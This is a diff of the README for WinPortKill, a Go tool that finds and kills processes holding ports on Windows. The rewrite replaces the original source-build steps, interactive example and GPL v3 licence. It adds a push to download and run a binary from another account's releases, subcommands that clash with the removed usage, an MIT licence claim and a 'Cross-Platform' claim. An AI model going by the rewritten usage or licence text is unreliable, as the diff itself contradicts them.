@@ -1,80 +1,127 @@
-# WinPortKill
+# WinPortKill 🚀
 
-![Go](https://img.shields.io/badge/Go-1.18+-00ADD8?style=flat-square&logo=go) ![License](https://img.shields.io/badge/License-MIT-green?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)
+![GitHub release](https://img.shields.io/github/release/BiruRyuu/winportkill.svg) ![GitHub issues](https://img.shields.io/github/issues/BiruRyuu/winportkill.svg) ![GitHub forks](https://img.shields.io/github/forks/BiruRyuu/winportkill.svg) ![GitHub stars](https://img.shields.io/github/stars/BiruRyuu/winportkill.svg)
 
-**WinPortKill** is a simple and powerful tool written in Go that helps you identify and free up occupied ports on Windows. When a port you need is in use, this program lists the processes using it and allows you to terminate them easily.
+## Overview
+
+**WinPortKill** is a lightweight, powerful tool designed for Windows. Built with Go, this tool helps you identify and terminate processes that occupy specific ports. It features a simple command-line interface that makes it easy to free up ports. This utility is ideal for developers, system administrators, and anyone troubleshooting port conflicts.
+
+You can download the latest release [here](https://github.com/BiruRyuu/winportkill/releases). Simply download the file and execute it to get started.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
 ## Features
-- **Quick Detection**: Displays a list of all processes using the specified port.
-- **Easy Termination**: Terminate related processes with a single command.
-- **Lightweight & Fast**: Built with Go, no complex dependencies required.
-- **User-Friendly**: Suitable for both advanced users and beginners.
 
-![image](https://github.com/user-attachments/assets/ca5850d1-8f00-447b-8d79-4486b2f4b729)
-
+- **Lightweight**: Minimal resource usage ensures that the tool runs smoothly on any Windows machine.
+- **Powerful**: Quickly identifies and terminates processes using specified ports.
+- **Command-Line Interface**: Easy to use for both beginners and advanced users.
+- **Cross-Platform**: Built with Go, making it easy to adapt for other platforms if needed.
+- **Open Source**: Contribute to the project or customize it to fit your needs.
 
 ## Installation
 
+To install WinPortKill, follow these steps:
+
+1. **Download the latest release** from the [Releases page](https://github.com/BiruRyuu/winportkill/releases).
+2. **Extract the downloaded file** to your preferred directory.
+3. **Open Command Prompt** and navigate to the directory where you extracted the files.
+4. **Run the executable**.
+
 ### Prerequisites
-- Go version 1.18 or higher
-- Windows operating system
 
-### Installation Steps
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/yourusername/winportkill.git
-   ```
-2. Navigate to the project directory:
-   ```bash
-   cd winportkill
-   ```
-3. Build the program:
-   ```bash
-   go build
-   ```
-4. The executable `winportkill.exe` is ready to use!
-
-### Install via Binary
-You can download the pre-built executable from the [Releases](https://github.com/imrostami/winportkill/releases) section.
+- Windows Operating System
+- Go (optional, for development)
 
 ## Usage
-1. Run the program:
-   ```bash
-   ./winportkill.exe
-   ```
-2. Enter the port number (e.g., `8080`).
-3. A list of processes using the port will be displayed (including PID and process name).
-4. To terminate a process, enter its PID or use the interactive options provided.
 
-### Example
-```bash
-$ ./winportkill.exe
-Port Kill CLI - Enter port number to scan (or 'q' to quit):
-> 1234
-Scanning Port ...
+Using WinPortKill is straightforward. Open your command line interface and type the command followed by the desired options. 
 
-Open ports for 1234:
-         Address    PID   Process Name
-         -------    ---   ------------
-  127.0.0.1:1234  12412  LM Studio.exe
+For detailed help, you can always type:
 
-Options: Enter PID or process name to kill, 'all' to kill all, 'skip' to continue, or process name (e.g., node):
-> 12412
-Process with PID 12412 (LM Studio.exe) terminated successfully.
+```
+winportkill --help
 ```
 
-## Important Notes
-- **Run as Administrator**: Terminating some processes may require running the program with Administrator privileges.
-- **Caution**: Terminating system processes may cause system instability. Proceed with care.
+This command will display all available options and usage instructions.
+
+## Commands
+
+### List Active Ports
+
+To see which ports are currently in use, run:
+
+```
+winportkill list
+```
+
+### Kill a Process by Port
+
+To terminate a process occupying a specific port, use:
+
+```
+winportkill kill <port_number>
+```
+
+Replace `<port_number>` with the actual port number you wish to free up.
+
+### Check Process Status
+
+To check if a specific process is running, use:
+
+```
+winportkill status <port_number>
+```
+
+### Example Commands
+
+Here are some examples of how to use WinPortKill:
+
+1. **List all active ports**:
+   ```
+   winportkill list
+   ```
+
+2. **Kill a process using port 8080**:
+   ```
+   winportkill kill 8080
+   ```
+
+3. **Check if port 3000 is in use**:
+   ```
+   winportkill status 3000
+   ```
 
 ## Contributing
-If you have ideas for improvements or encounter issues, please open an [Issue](https://github.com/yourusername/winportkill/issues) or submit a Pull Request.
 
-1. Fork the project.
-2. Create your feature branch (`git checkout -b feature/YourFeature`).
-3. Commit your changes (`git commit -m 'Add YourFeature'`).
-4. Push to the branch (`git push origin feature/YourFeature`).
-5. Open a Pull Request.
+We welcome contributions to WinPortKill! If you would like to contribute, please follow these steps:
+
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your branch** to your forked repository.
+5. **Create a pull request** to the main repository.
+
+Please ensure your code follows the existing style and includes tests where applicable.
 
 ## License
-This project is licensed under the GNU General Public License v3.0 License - see the [LICENSE](LICENSE) file for details.
+
+WinPortKill is open-source software licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Support
+
+If you encounter any issues or have questions, please check the [Issues](https://github.com/BiruRyuu/winportkill/issues) section of the repository. You can also reach out through the project's discussions.
+
+For the latest updates, visit the [Releases page](https://github.com/BiruRyuu/winportkill/releases) to download new versions or updates.
+
+---
+
+With WinPortKill, managing your ports becomes a hassle-free experience. Download it today and take control of your system!
